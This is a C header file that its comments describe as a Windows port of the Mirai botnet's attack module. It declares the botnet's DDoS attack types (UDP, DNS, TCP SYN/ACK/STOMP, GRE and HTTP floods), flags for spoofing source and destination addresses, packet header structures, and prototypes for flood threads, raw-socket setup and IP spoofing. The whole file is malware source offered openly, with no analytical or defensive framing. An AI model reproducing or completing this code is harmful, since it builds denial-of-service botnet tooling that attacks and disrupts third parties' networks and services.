// Windows attack module header
// Converted from Linux Mirai attack.h for Windows compatibility

#ifndef ATTACK_WINDOWS_H
#define ATTACK_WINDOWS_H

#ifdef _WIN32

#include <stdint.h>
#include <winsock2.h>
#include <windows.h>

// Attack configuration constants
#define ATTACK_MAX_THREADS 32
#define ATTACK_CONCURRENT_MAX 8

// Attack method IDs
#define ATTACK_UDP_GENERIC 0
#define ATTACK_UDP_VSE 1
#define ATTACK_UDP_DNS 2
#define ATTACK_TCP_SYN 3
#define ATTACK_TCP_ACK 4
#define ATTACK_TCP_STOMP 5
#define ATTACK_GREIP 6
#define ATTACK_GREETH 7
#define ATTACK_HTTP 8

// Attack flags
#define ATTACK_FLAG_SPOOF_SRC (1 << 0)
#define ATTACK_FLAG_SPOOF_DST (1 << 1)
#define ATTACK_FLAG_FRAGMENT (1 << 2)
#define ATTACK_FLAG_RANDOMIZE (1 << 3)

// Network structures for Windows
#pragma pack(push, 1)

// IP header structure
struct iphdr
{
  uint8_t version : 4,
      ihl : 4;
  uint8_t tos;
  uint16_t tot_len;
  uint16_t id;
  uint16_t frag_off;
  uint8_t ttl;
  uint8_t protocol;
  uint16_t check;
  uint32_t saddr;
  uint32_t daddr;
};

// TCP header structure
struct tcphdr
{
  uint16_t source;
  uint16_t dest;
  uint32_t seq;
  uint32_t ack_seq;
  uint16_t res1 : 4,
      doff : 4,
      fin : 1,
      syn : 1,
      rst : 1,
      psh : 1,
      ack : 1,
      urg : 1,
      ece : 1,
      cwr : 1;
  uint16_t window;
  uint16_t check;
  uint16_t urg_ptr;
};

// UDP header structure
struct udphdr
{
  uint16_t source;
  uint16_t dest;
  uint16_t len;
  uint16_t check;
};

// ICMP header structure
struct icmphdr
{
  uint8_t type;
  uint8_t code;
  uint16_t checksum;
  uint16_t id;
  uint16_t sequence;
};

// GRE header structure
struct gre_header
{
  uint16_t flags;
  uint16_t protocol;
};

// DNS header structure
struct dns_header
{
  uint16_t id;
  uint16_t flags;
  uint16_t qdcount;
  uint16_t ancount;
  uint16_t nscount;
  uint16_t arcount;
};

#pragma pack(pop)

// Attack target structure
struct attack_target
{
  uint32_t addr;
  uint16_t port;
  uint32_t duration;
  uint8_t attack_id;
  uint8_t flags;
  uint32_t netmask;
  uint8_t addrs_len;
  uint32_t *addrs;
};

// Attack vector structure
struct attack_vector
{
  char *name;
  DWORD(WINAPI *handler)(LPVOID);
};

// Attack statistics
struct attack_stats
{
  uint64_t packets_sent;
  uint64_t bytes_sent;
  uint32_t connections_made;
  uint32_t threads_active;
  time_t attack_start;
  time_t attack_duration;
};

// Attack state management
typedef enum
{
  ATTACK_STATE_IDLE,
  ATTACK_STATE_RUNNING,
  ATTACK_STATE_STOPPING,
  ATTACK_STATE_ERROR
} attack_state_t;

// Function prototypes

// Core attack management
BOOL attack_init(void);
void attack_cleanup(void);
void attack_kill_all(void);
BOOL attack_start(uint8_t attack_id, struct attack_target *target, uint8_t flags);
attack_state_t attack_get_state(void);
void attack_get_stats(struct attack_stats *stats);

// Individual attack methods
DWORD WINAPI attack_udp_generic(LPVOID param);
DWORD WINAPI attack_udp_vse(LPVOID param);
DWORD WINAPI attack_udp_dns(LPVOID param);
DWORD WINAPI attack_tcp_syn(LPVOID param);
DWORD WINAPI attack_tcp_ack(LPVOID param);
DWORD WINAPI attack_tcp_stomp(LPVOID param);
DWORD WINAPI attack_greip(LPVOID param);
DWORD WINAPI attack_greeth(LPVOID param);
DWORD WINAPI attack_http(LPVOID param);

// Utility attack functions
DWORD WINAPI attack_tcp_connect_flood(LPVOID param);
uint16_t attack_checksum_tcp(struct iphdr *iph, struct tcphdr *tcph, uint8_t *data, int data_len);
uint16_t attack_checksum_udp(struct iphdr *iph, struct udphdr *udph, uint8_t *data, int data_len);
uint16_t attack_checksum_ip(struct iphdr *iph);
uint16_t attack_checksum_generic(void *data, int len);

// Network utility functions
BOOL attack_resolve_target(char *hostname, uint32_t *addr);
BOOL attack_get_local_ip(uint32_t *local_ip);
BOOL attack_get_interface_info(struct attack_target *target);
void attack_randomize_payload(char *buffer, size_t len);

// Windows-specific attack utilities
BOOL attack_enable_raw_sockets(void);
BOOL attack_set_socket_options(SOCKET sock, int attack_type);
BOOL attack_spoof_source_ip(SOCKET sock, uint32_t spoofed_ip);
void attack_log_error(const char *function, const char *message);

// Attack validation and limits
BOOL attack_validate_target(struct attack_target *target);
BOOL attack_check_rate_limits(uint32_t target_ip);
void attack_update_rate_limits(uint32_t target_ip, size_t bytes_sent);

// Memory and resource management
struct attack_target *attack_target_alloc(void);
void attack_target_free(struct attack_target *target);
void attack_clear_stats(void);

// Protocol-specific helpers
void attack_build_ip_header(struct iphdr *ip, uint32_t src, uint32_t dst, uint8_t proto, uint16_t len);
void attack_build_tcp_header(struct tcphdr *tcp, uint16_t sport, uint16_t dport, uint32_t seq, uint8_t flags);
void attack_build_udp_header(struct udphdr *udp, uint16_t sport, uint16_t dport, uint16_t len);

// Attack scheduler and manager
typedef struct
{
  uint8_t attack_id;
  struct attack_target *target;
  HANDLE thread_handle;
  DWORD thread_id;
  time_t start_time;
  BOOL is_active;
} attack_thread_info;

BOOL attack_schedule(uint8_t attack_id, struct attack_target *target, uint32_t delay_ms);
void attack_thread_cleanup(attack_thread_info *info);
int attack_get_active_count(void);

// Configuration and tuning
#define ATTACK_DEFAULT_TIMEOUT_MS 30000
#define ATTACK_DEFAULT_PACKET_SIZE 1024
#define ATTACK_MAX_PACKET_SIZE 1500
#define ATTACK_MIN_PACKET_SIZE 64
#define ATTACK_RATE_LIMIT_WINDOW 60              // seconds
#define ATTACK_MAX_RATE_PER_TARGET (1024 * 1024) // 1MB/s per target

// Error codes
#define ATTACK_ERROR_NONE 0
#define ATTACK_ERROR_INVALID_TARGET 1
#define ATTACK_ERROR_SOCKET_FAILED 2
#define ATTACK_ERROR_BIND_FAILED 3
#define ATTACK_ERROR_THREAD_FAILED 4
#define ATTACK_ERROR_RATE_LIMITED 5
#define ATTACK_ERROR_PERMISSION_DENIED 6

#endif // _WIN32

#endif // ATTACK_WINDOWS_H